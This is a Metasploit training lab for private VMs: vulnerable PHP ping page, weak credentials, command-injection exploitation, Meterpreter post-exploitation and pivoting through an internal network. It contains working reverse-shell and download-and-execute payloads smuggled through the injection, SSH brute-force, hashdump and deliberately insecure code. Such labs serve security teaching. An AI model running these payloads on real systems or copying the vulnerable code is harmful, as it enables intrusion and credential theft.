# Lab: Metasploit — Hands-On Exploitation Practice

## Objective

Learn Metasploit's core workflows by exploiting real services on your VMs. Covers scanning, exploitation, Meterpreter post-exploitation, pivoting through sessions, and using Metasploit as an attack platform.

---

## Setup

### Debian (192.168.244.132) — Vulnerable web services

```bash
sudo apt update && sudo apt install apache2 php libapache2-mod-php openssh-server vsftpd -y
sudo systemctl enable --now apache2 ssh

echo "FLAG{metasploit_debian_owned}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

# Vulnerable PHP app (command injection for MSF to exploit)
sudo mkdir -p /var/www/html/app
cat << 'PHPEOF' | sudo tee /var/www/html/app/ping.php
<?php
if(isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    echo "<pre>" . shell_exec("ping -c 2 " . $ip) . "</pre>";
}
?>
<html><body>
<h1>Network Ping Tool</h1>
<form method="GET">IP: <input name="ip" size="20"> <button>Ping</button></form>
</body></html>
PHPEOF

# Create a user with weak credentials (for brute force exercise)
sudo useradd -m -s /bin/bash testuser && echo "testuser:password123" | sudo chpasswd

# Privesc: sudo python3
echo "testuser ALL=(root) NOPASSWD: /usr/bin/python3" | sudo tee /etc/sudoers.d/testuser

# FTP with anonymous access
sudo sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf 2>/dev/null
echo "anonymous_enable=YES" | sudo tee -a /etc/vsftpd.conf 2>/dev/null
sudo mkdir -p /srv/ftp/pub
echo "Internal SSH: testuser / password123" | sudo tee /srv/ftp/pub/notes.txt
sudo systemctl restart vsftpd 2>/dev/null

sudo iptables -F && sudo iptables -P INPUT ACCEPT
```

### CentOS (192.168.244.131 / 172.16.0.1) — Pivot target

```bash
sudo systemctl stop firewalld && sudo systemctl disable firewalld
sudo systemctl enable --now sshd

sudo ip addr add 172.16.0.1/24 dev ens224 2>/dev/null && sudo ip link set ens224 up

echo "FLAG{metasploit_centos_pivoted}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

sudo useradd -m -s /bin/bash sshuser && echo "sshuser:Ss4Us3r!" | sudo chpasswd

# Breadcrumb for Ubuntu
echo "Ubuntu deploy: 172.16.0.2 user=deploy pass=D3pl0y!" | sudo tee /home/sshuser/deploy_info.txt
sudo chown sshuser:sshuser /home/sshuser/deploy_info.txt

# Privesc: SUID find
sudo cp /usr/bin/find /usr/local/bin/find_tool
sudo chmod u+s /usr/local/bin/find_tool

# Enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens224 -j MASQUERADE
```

### Ubuntu (172.16.0.2) — Internal target for pivoting exercise

```bash
sudo ip addr add 172.16.0.2/24 dev ens38 2>/dev/null && sudo ip link set ens38 up
sudo apt update && sudo apt install openssh-server apache2 php -y
sudo systemctl enable --now ssh apache2

echo "FLAG{metasploit_internal_reached}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

sudo useradd -m -s /bin/bash deploy && echo "deploy:D3pl0y!" | sudo chpasswd

echo "<h1>Internal App</h1><p>Deployment Server</p><p>FLAG{metasploit_webapp_internal}</p>" | sudo tee /var/www/html/index.html

sudo iptables -F
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -s 172.16.0.0/24 -j ACCEPT
sudo iptables -P INPUT DROP && sudo iptables -P OUTPUT ACCEPT
```

---

## Exercise 1: Metasploit Basics — Scanning and Enumeration

### Start Metasploit and scan

```bash
msfconsole -q

# Initialize the database (if first time)
db_status
# If not connected:
# Exit MSF, run: sudo msfdb init, then restart msfconsole

# Scan the target — results are saved to the MSF database
db_nmap -sV -sC 192.168.244.132
```

**What `db_nmap` does:** Runs nmap but stores all results in Metasploit's database. Now you can query them:

```bash
hosts                    # list all discovered hosts
services                 # list all discovered services
services -p 22           # hosts with SSH
services -p 80           # hosts with HTTP
vulns                    # any vulnerabilities found by scripts
```

### Scan for specific vulnerabilities

```bash
# FTP anonymous check
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.244.132
run
# Tells you if anonymous FTP is enabled

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.244.132
set USERNAME testuser
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set THREADS 4
run
# When it finds the password, it opens a session automatically!
```

### Check your sessions

```bash
sessions -l
# Shows any sessions opened by successful exploits/scans
sessions -i 1
# Interact with session 1
```

---

## Exercise 2: Exploitation — Getting a Shell

### Method 1: Exploit via the SSH session from the brute force

```bash
# If the SSH brute force from Exercise 1 opened a session:
sessions -i 1
whoami          # testuser
id
```

### Method 2: Use a web delivery payload

```bash
# Generate a payload that downloads and executes
use exploit/multi/script/web_delivery
set TARGET 7                              # Linux (Python)
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.244.129
set LPORT 4444
exploit -j
```

This generates a Python command like:

```
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://KALI:8080/RANDOM').read())"
```

**Execute it through the command injection on Debian:**

```bash
# In another terminal — trigger the payload through the web app
curl --get http://192.168.244.132/app/ping.php --data-urlencode "ip=127.0.0.1;python3 -c \"import urllib.request; exec(urllib.request.urlopen('http://192.168.244.129:8080/PASTE_TOKEN').read())\""
```

**Back in msfconsole:**

```bash
sessions -l
# New Meterpreter session!
sessions -i 2
meterpreter> sysinfo
meterpreter> getuid
```

### Method 3: Multi/handler with a manual reverse shell

```bash
# Set up the listener
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 192.168.244.129
set LPORT 5555
run -j                                    # run in background

# In another terminal, trigger a bash reverse shell
curl --get http://192.168.244.132/app/ping.php --data-urlencode "ip=127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.244.129/5555 0>&1'"

# Back in msfconsole
sessions -l
sessions -i 3
```

---

## Exercise 3: Meterpreter Post-Exploitation

Once you have a Meterpreter session:

### System information

```bash
meterpreter> sysinfo                     # OS, hostname, arch
meterpreter> getuid                      # current user
meterpreter> getpid                      # current process ID
meterpreter> ps                          # running processes
meterpreter> ifconfig                    # network interfaces
meterpreter> route                       # routing table
meterpreter> arp                         # ARP table
```

### File operations

```bash
meterpreter> pwd                         # current directory
meterpreter> ls                          # list files
meterpreter> cd /home/testuser
meterpreter> cat /etc/passwd
meterpreter> download /etc/passwd /tmp/loot/
meterpreter> upload /home/kali/tools/linpeas.sh /tmp/
```

### Shell access

```bash
meterpreter> shell                       # drop to a system shell
whoami
cat /root/flag.txt                       # if you're root
exit                                      # back to Meterpreter
```

### Privilege escalation suggestion

```bash
# Run the local exploit suggester
background                               # background current session
use post/multi/recon/local_exploit_suggester
set SESSION 2                            # your Meterpreter session number
run
# Lists potential privilege escalation exploits for this system
```

### Credential gathering

```bash
# Linux hash dump (needs root)
use post/linux/gather/hashdump
set SESSION 2
run

# Enumerate network
use post/multi/gather/ping_sweep
set SESSION 2
set RHOSTS 172.16.0.0/24
run
```

---

## Exercise 4: Pivoting Through Metasploit

### Set up routing through your session

```bash
# From your Meterpreter session on CentOS (or Debian if it has dual NICs)
# First, SSH to CentOS to get a session there

# Method: use the SSH login scanner
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.244.131
set USERNAME sshuser
set PASSWORD Ss4Us3r!
run
# Opens a session on CentOS

# Switch to that session
sessions -i SESSION_NUMBER

# Check for internal networks
ifconfig
# ens224: 172.16.0.1/24 — internal network!

# Set up autoroute
run autoroute -s 172.16.0.0/24
```

**What autoroute does:** Tells Metasploit "any traffic to 172.16.0.0/24 should go through this session." Now ALL Metasploit modules can target the internal network.

### Scan the internal network through the pivot

```bash
background

# Port scan through the session
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.0.2
set PORTS 22,80,443,445,3389,5985
run
# Shows: 22/open, 80/open on 172.16.0.2
```

### Set up a SOCKS proxy for external tools

```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Now configure proxychains (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080

# Use external tools through the pivot
proxychains curl http://172.16.0.2
# Shows: Internal App page with FLAG{metasploit_webapp_internal}

proxychains ssh deploy@172.16.0.2
# Password: D3pl0y!
```

### Port forward a specific service

```bash
# If you still have the Meterpreter session:
sessions -i SESSION_NUMBER
portfwd add -l 8080 -p 80 -r 172.16.0.2
# Kali localhost:8080 → Ubuntu 172.16.0.2:80

# In another terminal:
curl http://localhost:8080
# Shows the internal web app
```

---

## Exercise 5: Full Chain with Metasploit

Put it all together in one continuous engagement:

```bash
# Step 1: Scan
msfconsole -q
db_nmap -sV -sC 192.168.244.132 192.168.244.131

# Step 2: Brute force SSH on Debian
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.244.132
set USERNAME testuser
set PASSWORD password123
run
# Session opened!

# Step 3: Upgrade to Meterpreter
sessions -u 1                            # upgrade shell to Meterpreter

# Step 4: Enumerate Debian
sessions -i 2
sysinfo
cat /etc/passwd

# Step 5: SSH to CentOS (using creds found on Debian FTP)
background
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.244.131
set USERNAME sshuser
set PASSWORD Ss4Us3r!
run
# Session on CentOS!

# Step 6: Read the deploy info
sessions -i 3
cat /home/sshuser/deploy_info.txt
# Ubuntu deploy: 172.16.0.2 user=deploy pass=D3pl0y!

# Step 7: Pivot to internal network
run autoroute -s 172.16.0.0/24
background

# Step 8: Scan internal network through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.0.2
set PORTS 22,80
run

# Step 9: SOCKS proxy for external tools
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

# Step 10: Access internal target
proxychains ssh deploy@172.16.0.2
# You're on the internal Ubuntu server through Metasploit's pivot!
```

---

## Metasploit Commands Cheat Sheet

```bash
# Navigation
search KEYWORD          # find modules
use MODULE              # select module
show options            # required settings
set OPTION VALUE        # set an option
run / exploit           # execute
back                    # deselect module

# Sessions
sessions -l             # list all
sessions -i N           # interact
sessions -u N           # upgrade to Meterpreter
sessions -k N           # kill session
background              # background current

# Database
db_nmap FLAGS TARGET    # scan + store results
hosts                   # list hosts
services                # list services
vulns                   # list vulns

# Meterpreter
sysinfo / getuid / getpid
shell                   # drop to OS shell
upload / download       # file transfer
cat / ls / cd / pwd     # file operations
ifconfig / route / arp  # network info
portfwd add -l LP -p RP -r RHOST
run autoroute -s SUBNET

# Post modules
post/multi/recon/local_exploit_suggester
post/windows/gather/hashdump
post/linux/gather/hashdump
auxiliary/server/socks_proxy
```

---

## Cleanup

```bash
# Debian
sudo userdel -r testuser && sudo rm /etc/sudoers.d/testuser /root/flag.txt
sudo rm -rf /var/www/html/app /srv/ftp/pub

# CentOS
sudo userdel -r sshuser && sudo rm /usr/local/bin/find_tool /root/flag.txt
sudo iptables -F && sudo iptables -t nat -F

# Ubuntu
sudo userdel -r deploy && sudo rm /root/flag.txt
echo "<h1>It works!</h1>" | sudo tee /var/www/html/index.html
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
